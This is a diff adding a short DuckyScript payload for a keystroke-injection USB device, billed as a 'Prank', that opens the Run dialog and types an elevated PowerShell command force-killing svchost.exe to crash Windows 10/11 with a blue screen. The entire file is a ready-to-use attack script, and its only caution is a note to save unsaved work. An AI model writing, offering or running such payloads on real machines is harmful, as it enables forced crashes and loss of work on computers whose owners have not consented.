@@ -1,0 +1,12 @@
+REM Title: BSOD
+REM Author: h1dd3n3y3
+REM Description: Trigger Windows BSOD. IMPORTANT: Save any unsaved work.
+REM Target: Windows 10/11
+REM Version: 2.0
+REM Category: Prank
+
+DELAY 500
+GUI R
+DELAY 100
+STRING powershell -Command "Start-Process cmd '/c taskkill /IM svchost.exe /f' -Verb RunAs"
+ENTER
